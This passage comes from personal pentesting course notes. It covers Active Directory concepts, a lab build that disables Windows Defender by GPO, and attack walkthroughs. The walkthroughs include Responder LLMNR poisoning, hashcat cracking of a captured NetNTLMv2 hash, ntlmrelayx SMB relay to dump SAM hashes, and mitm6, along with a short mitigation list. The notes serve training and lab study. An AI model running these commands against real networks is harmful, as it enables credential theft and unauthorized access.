</code></pre><h3 id="988ba519-d825-49e4-b392-71cddab2ad6c" class=""><strong>Organizational Units (Ous)</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#organizational-units-ous"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a6ed4e6b-5812-4de4-b30a-07bfc032f02d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">AD containers that contain users, groups, computers and others OUs
Delegate permissions to administer groups of objects
Represent your organization hierarchically and logically
</code></pre><h3 id="bcc6d0a8-ab80-417e-b458-da2902bd9986" class=""><strong>Trusts</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#trusts"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="72c486d6-3344-4c95-aaf0-e0bed01fc7ac" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">How we have access between resources:
Directional = trust goes to trusted domain to a trusted domain
Transitive = trust relationship is extended beyond a two-domain trust
</code></pre><h3 id="8fe2d05b-c89e-4012-a558-27eabacb9d36" class=""><strong>Objects</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#objects"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c7681e93-2e07-4e65-b176-6285db725afa" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">whats inside OUs:
user, group, computer, printers, contacts, shared folders, etc
</code></pre><h2 id="a3cbd699-a624-45af-a646-e23d4ed916d4" class=""><strong>Lab Overview and Requirements</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#lab-overview-and-requirements"></a></strong></h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1938d9f0-60d4-4231-b959-d13b4ab324b1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1 Windows Server 2019
2 Windows 10 Enterprise

Requirements:
60 GB Disk Space
16 GB RAM
</code></pre><h3 id="648f9f46-10d7-4b07-8d1a-587fed6a1cf6" class=""><strong>Links</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#links"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="97920927-ffdd-4a9b-94b0-ff39a144a897" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://www.microsoft.com/pt-br/evalcenter/evaluate-windows-10-enterprise
https://www.microsoft.com/pt-br/evalcenter/evaluate-windows-server-2019
</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bf5ca563-e9d7-4a04-9062-20ec73e3f8f7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Install AD DS on server
setup the AD
change the names of the computers
</code></pre><h3 id="df50abd0-9b31-4775-9199-b98674a9c51c" class=""><strong>cmd with admin privileges</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#cmd-with-admin-privileges"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6a3d2f66-4da3-4644-8f88-9832ca02f087" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">setspn -a SAIBOT-DC/SQLService.MK.local:60111 MK\SQLService
# -a = domain controller
</code></pre><h3 id="c474e3f9-d146-4903-a6fd-bfa0370659ed" class=""><strong>Create a GPO in the forest domain, - disable windows defender</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#create-a-gpo-in-the-forest-domain---disable-windows-defender"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0f1f475f-71a9-4a24-85cc-b67ba9ca5525" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">windows &gt; administrative &gt; Windows components &gt; Windows defender &gt; disable w defender
set the enforced option in GPO &gt; Rule &gt; scope &gt; enforced = &quot;yes&quot;
This will make sure that every machine in the domain, disable the windows defender
</code></pre><ul id="4aea3f19-03fe-425c-9e4d-ad7178806a8a" class="bulleted-list"><li style="list-style-type:disc">add both machines to the domain</li></ul><ul id="156ae681-e57f-433e-81c4-d11d8bcbb8aa" class="bulleted-list"><li style="list-style-type:disc">log with administrator in both machines and</li></ul><ul id="1aff7f8e-cf3c-4102-a542-6ede329a3c78" class="bulleted-list"><li style="list-style-type:disc">add one user to local admin in his machine and another with local admin in the 2 machines</li></ul><ul id="803fb434-0491-4718-8ad6-1a10d27afe33" class="bulleted-list"><li style="list-style-type:disc">create a file called <strong>share</strong> in C:\ in both machines</li></ul><h2 id="84eccd72-153c-4cce-85dd-bdae7f7eaa23" class=""><strong>Attacking AD: Initial Attack Vectors</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#attacking-ad-initial-attack-vectors"></a></strong></h2><h3 id="7f2da93e-6566-4785-a30a-49ef940b1c8d" class=""><strong>LLMNR - Poisoning</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#llmnr---poisoning"></a></strong></h3><p id="641ff111-31ec-48e7-8735-c1ec5c45a03d" class="">Used to identify hosts when DNS fails to do so.</p><p id="dc9422d2-eb4f-45d8-a8d8-9b240bd0c085" class=""><strong>Step 1</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="46c37a37-dd80-4e42-b80a-c9855d6f95ad" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Run Responder
python Responder.py -I tun0 -rdw
</code></pre><p id="1c1e8701-52f6-48f7-8d4e-01dea1b22b57" class=""><strong>Step 2</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c3330e64-8bea-461a-ae07-2d76d5ad0712" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">An Event Occurs...
</code></pre><p id="16c632b5-232f-4a38-99fc-2870a0c7e061" class=""><strong>Step 3</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a7edb62c-ecb3-4fd1-a23d-c6731377c962" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Get Dem Hashes
</code></pre><p id="ab36b59c-65cf-4b06-83cf-b917e77fa42c" class=""><strong>Step 4</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c8c458ed-3bfd-41fa-89d9-4683e1a462e5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Crack Dem Hashes:
hashcat -m 5600 hash.txt rockyou.txt
</code></pre><h3 id="8684b86f-1fa0-4ae6-a2f1-a01c49e2fe8b" class=""><strong>SMB Relay</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#smb-relay"></a></strong></h3><p id="ba080427-bcbb-4427-a184-bbc816979b0f" class="">Instead of cracking hashes, we can relay those hashes to specific machines and potentially gain access</p><p id="61618050-3240-4fa7-8d8d-72ee90473f8b" class="">SMB signing must be disabled on the target</p><p id="bf318530-678f-4eca-9725-ea0402d3799f" class=""><strong>Step 1</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="60608abe-214e-4b54-a218-00d8926425e4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">	Run Responder -&gt; nano responder.conf
	disable SMB and HTTP -&gt; cause we are going to be listening but not responding back
</code></pre><p id="086e584a-3d75-44cd-9294-063bee66c518" class=""><strong>Step 2</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4bcf68c0-ddf7-4848-9c06-95fbff0f3883" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python Responder.py -I tun0 -rdw
</code></pre><p id="730fb0b7-bd51-4ec2-b80d-1643b4c376cb" class=""><strong>Step 3</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f554e5c8-5cfb-4d01-9e4d-985c2eb378d9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set up your relay:
python ntlmrelayx.py -tf target.txt -smb2support
</code></pre><p id="6f14df40-9cc3-4c2e-bbac-edc99ce0c4ef" class=""><strong>Step 4</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6290add5-3519-450f-bf6a-dedc1ce3db73" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">An Event occours...
</code></pre><p id="b94bb286-6d41-4699-88fd-cd4e7a2db7b1" class=""><strong>Step 5</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fdd888ec-c8ee-46e6-a1cf-c5a035167d76" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Win!
</code></pre><h3 id="f0a1aeff-d32e-408d-870d-b7f5d5ab7118" class=""><strong>IPv6 Attacks Overview</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#ipv6-attacks-overview"></a></strong></h3><p id="1eb4477b-20d8-4e8c-b3a6-3fee8f260926" class="">We are gonna set a DNS to the Ipv6 because they generally do not have one.</p><p id="b3eb12fb-1afc-46b6-b54d-f0be6d7d09e8" class="">So I will get information and set NTLM with MITM6 to create an account in DC <strong>Step 1</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19f67c27-cd31-4558-bd76-c1be2004dd00" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">download MITM6 &gt; https://github.com/dirkjanm/mitm6.git
</code></pre><p id="cf6678a6-9962-4200-bb18-824d8c3d330c" class=""><strong>Step 2</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5ea761a6-aa28-4f66-b290-9fb517603a48" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">In the server &gt; manage &gt;  add roles and features &gt; active directory certificate services &gt; cert authority
</code></pre><ul id="8392142a-0b1c-4fa7-bc09-8340354be392" class="bulleted-list"><li style="list-style-type:disc">Take a look at PassBack attack - look at printers, sometimes we can redirect the networking in the config</li></ul><ul id="c758d9b6-8101-474a-9bd5-c7d828ae8f4b" class="bulleted-list"><li style="list-style-type:disc">page of the printer to our kali machine and set up a netcat or a responder to get the password/access</li></ul><h3 id="5ff7d747-5c63-4ccb-985b-6f74712993ed" class=""><strong>LLMNR</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#llmnr"></a></strong></h3><p id="1c2be329-afd6-4b5e-8174-43c2953c5c2f" class="">IPS:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="344b4c15-e259-466f-926b-b2bcee73dbd8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">server = 172.16.127.129
ermac-pc1 = 172.16.127.128
subzero-pc2 = 172.16.127.130
</code></pre><h3 id="14f9bd41-d036-4a1a-832f-8d1cf283d13a" class=""><strong>Responder</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#responder"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0b998067-3de2-4ebc-8c0e-9512efaa35b0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">responder -I eth0 -rdw

# tips is to run this tool early in the morning
# any machine in the AD who access our attacker IP
# the responder is gonna capture their hashes
</code></pre><h3 id="e4311550-f31f-44c8-a964-88ca0eaa5e57" class=""><strong>Go crack with hashcat</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#go-crack-with-hashcat"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eba330a4-5f0d-419f-a175-16672694452f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">hashcat -m 5600 hash rockyou.txt
# -m 5600 = NetNTLMv2

ERMAC::MK:c1a71fa9c4173965:a53bb1b11fd1444e7ec42216ec49a04f:01010000000000008011f80f19c9d70150783cc36d9aafd40000000002000800410038005200360001001e00570049004e002d004a0056005800470054004c004200510049004f00540004003400570049004e002d004a0056005800470054004c004200510049004f0054002e0041003800520036002e004c004f00430041004c000300140041003800520036002e004c004f00430041004c000500140041003800520036002e004c004f00430041004c00070008008011f80f19c9d7010600040002000000080030003000000000000000010000000020000054c8bbe07c882c5bd501dc943c19e4c47c1ba84a9556cd1beb5930ca01be55b30a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e0030002e00310031000000000000000000:&#x27;Password1&#x27;
</code></pre><h3 id="bfa9f61c-58f4-4a96-bf3c-758d8df18c7b" class=""><strong>Mitigation - LLMNR - NBT-NS</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation---llmnr---nbt-ns"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="222e4086-2020-4be3-80a6-397c531569a9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Disable LLMNR and NBT-NS
Require Network Access Control
Require strong user passwords &gt;14 characters + the more complex harder to attacker to break it
</code></pre><h3 id="76b0a83e-cc66-4a8d-aa78-b1e51d041945" class=""><strong>SMB Relay</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#smb-relay-1"></a></strong></h3><h3 id="951ed0e8-a394-4b3b-9781-1053d240829e" class=""><strong>Discovering Hosts with SMB Signing Disabled</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#discovering-hosts-with-smb-signing-disabled"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c9002f55-e83a-41cc-8913-52d035ae2b5a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nmap --script=smb2-security-mode.nse -p 445 &lt;ip&gt;/24
# &#x27;Message signing enabled but not required&#x27; - This is what we need to perform this attack

/etc/responder/Responder.conf
# turnoff SMB and HTTP
</code></pre><p id="6da8fc15-432b-44d4-ad1a-84cef9a73bba" class=""><strong>Attack walkthrough</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="027117ca-c28f-49c3-b1c5-32bccdabc87e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">responder -I eth0 -rdw
python ntlmrelayx.py -tf target.txt -smb2support

# connect to our attack IP
# Get the SAM hashes = it would be like shadow in linux
